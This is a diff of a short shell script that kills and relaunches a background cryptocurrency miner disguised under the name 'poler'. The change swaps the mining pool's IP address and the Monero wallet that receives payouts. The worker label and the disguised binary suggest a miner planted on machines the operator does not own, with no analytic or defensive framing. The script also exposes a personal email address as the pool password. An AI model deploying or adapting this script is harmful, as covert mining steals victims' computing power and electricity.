@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 4 -o 185.251.38.181:6002 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w15-ekonomka:ivanovandrey1984g@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 4 -o 94.103.80.3:5983 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=w15-ekonomka:ivanovandrey1984g@gmail.com -k
